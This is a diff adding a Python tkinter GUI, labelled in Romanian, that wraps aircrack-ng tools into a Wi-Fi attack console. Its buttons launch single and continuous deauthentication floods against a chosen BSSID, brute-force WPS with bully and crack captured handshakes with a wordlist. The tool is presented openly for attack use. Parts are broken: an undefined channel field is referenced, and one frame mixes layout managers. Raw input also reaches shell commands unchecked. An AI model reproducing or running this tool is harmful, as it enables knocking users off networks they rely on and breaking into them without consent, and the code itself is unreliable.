@@ -1,0 +1,161 @@
+import os
+import tkinter as tk
+from tkinter import messagebox, filedialog, scrolledtext
+from threading import Thread
+import subprocess
+import time
+import re
+
+scanning = False
+csv_file = "/tmp/airodump_output.csv"  # Fișier unde salvează airodump-ng
+
+def start_monitor():
+    global scanning
+    interface = interface_entry.get().strip()
+    if not interface:
+        messagebox.showerror("error", "Introdu o interfață validă!")
+        return
+    os.system(f"airmon-ng start {interface}")
+    output_text.insert(tk.END, "[INFO] Monitor mode pornit.\n")
+    scanning = True
+    Thread(target=scan_networks, args=(interface,)).start()
+
+def stop_monitor():
+    global scanning
+    interface = interface_entry.get().strip()
+    if interface:
+        scanning = False
+        os.system(f"airmon-ng stop {interface}mon")
+        output_text.insert(tk.END, "[INFO] Monitor mode oprit.\n")
+        network_text.delete(1.0, tk.END)
+    else:
+        messagebox.showerror("error", "Introdu o interfață validă!")
+
+def scan_networks(interface):
+    global csv_file
+    network_text.delete(1.0, tk.END)
+    
+    os.system(f"rm -f {csv_file}")  # Ștergem fișierul CSV anterior dacă există
+    command = f"airodump-ng {interface}mon --write {csv_file} --output-format csv"
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    while scanning:
+        time.sleep(3)  # Așteptăm ca airodump-ng să scrie date
+        if os.path.exists(csv_file):
+            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+                lines = f.readlines()
+                
+            network_text.delete(1.0, tk.END)
+            for line in lines:
+                parts = line.split(',')
+                if len(parts) > 13 and parts[0].strip() and parts[13].strip():
+                    bssid = parts[0].strip()
+                    essid = parts[13].strip()
+                    network_text.insert(tk.END, f"{bssid} - {essid}\n")
+
+    process.terminate()  # Oprim airodump-ng la final
+
+def execute_command(command):
+    output_text.insert(tk.END, f"[EXEC] {command}\n")
+    
+    def run_command():
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
+            for line in iter(process.stdout.readline, ""):
+                output_text.insert(tk.END, line)
+                output_text.see(tk.END)
+            process.stdout.close()
+            process.wait()
+        except Exception as e:
+            output_text.insert(tk.END, f"[ERROR] {str(e)}\n")
+    
+    Thread(target=run_command).start()
+
+def is_valid_bssid(bssid):
+    return re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid) is not None
+
+def attack_deauth():
+    bssid = bssid_entry.get().strip()
+    interface = interface_entry.get().strip()
+    if is_valid_bssid(bssid) and interface:
+        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}mon")
+    else:
+        messagebox.showerror("error", "Introdu un BSSID valid!")
+
+def continuous_deauth():
+    bssid = bssid_entry.get().strip()
+    interface = interface_entry.get().strip()
+    if is_valid_bssid(bssid) and interface:
+        output_text.insert(tk.END, "[INFO] Atac deauth flood continuu lansat...\n")
+        Thread(target=lambda: os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}mon"), daemon=True).start()
+    else:
+        messagebox.showerror("error", "Introdu un BSSID valid!")
+
+def stop_deauth():
+    output_text.insert(tk.END, "[INFO] Atac deauth flood oprit.\n")
+    os.system("killall aireplay-ng")
+
+def brute_force_wps():
+    bssid = bssid_entry.get().strip()
+    channel = channel_entry.get().strip()
+    if is_valid_bssid(bssid) and channel:
+        execute_command(f"bully -b {bssid} -c {channel} -v")
+    else:
+        messagebox.showerror("error", "Introdu un BSSID și canal valide!")
+
+def crack_handshake():
+    cap_file = filedialog.askopenfilename(filetypes=[("Fișiere captură", "*.cap")])
+    wordlist = filedialog.askopenfilename(filetypes=[("Fișiere text", "*.txt")])
+    if cap_file and wordlist:
+        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
+    else:
+        messagebox.showerror("error", "Selectează fișierul de captură și wordlist-ul!")
+
+root = tk.Tk()
+root.title("simplified_marauder")
+root.geometry("1200x700")
+root.configure(bg="black")
+
+top_frame = tk.Frame(root, bg="black")
+top_frame.pack(side=tk.TOP, fill=tk.X, padx=20, pady=10)
+
+tk.Label(top_frame, text="Interfață Wi-Fi:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
+interface_entry.pack(side=tk.LEFT, padx=5)
+tk.Button(top_frame, text="Pornește monitor mode", command=start_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+tk.Button(top_frame, text="Oprește monitor mode", command=stop_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+
+middle_frame = tk.Frame(root, bg="black")
+middle_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=20, pady=10)
+
+left_frame = tk.Frame(middle_frame, bg="black")
+left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
+tk.Label(left_frame, text="Live comenzi & output", bg="black", fg="white").pack(anchor="w")
+output_text = scrolledtext.ScrolledText(left_frame, bg="black", fg="white")
+output_text.pack(fill=tk.BOTH, expand=True)
+
+right_frame = tk.Frame(middle_frame, bg="black")
+right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10)
+tk.Label(right_frame, text="Rețele disponibile", bg="black", fg="white").pack(anchor="w")
+network_text = tk.Text(right_frame, bg="black", fg="white", wrap=tk.WORD)
+network_text.pack(fill=tk.BOTH, expand=True)
+
+bottom_frame = tk.Frame(root, bg="black")
+bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)
+
+tk.Label(bottom_frame, text="BSSID pentru atac:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+bssid_entry = tk.Entry(bottom_frame, bg="black", fg="white", insertbackground="white")
+bssid_entry.pack(side=tk.LEFT, padx=5)
+
+buttons = [
+    ("Atac deauth", attack_deauth),
+    ("Deauth flood continuu", continuous_deauth),
+    ("Oprește deauth", stop_deauth),
+    ("Brute-force WPS", brute_force_wps),
+    ("Sparge handshake", crack_handshake)
+]
+
+for i, (text, cmd) in enumerate(buttons):
+    tk.Button(bottom_frame, text=text, command=cmd, bg="black", fg="white").grid(row=i//4, column=i%4, padx=5, pady=5)
+
+root.mainloop()
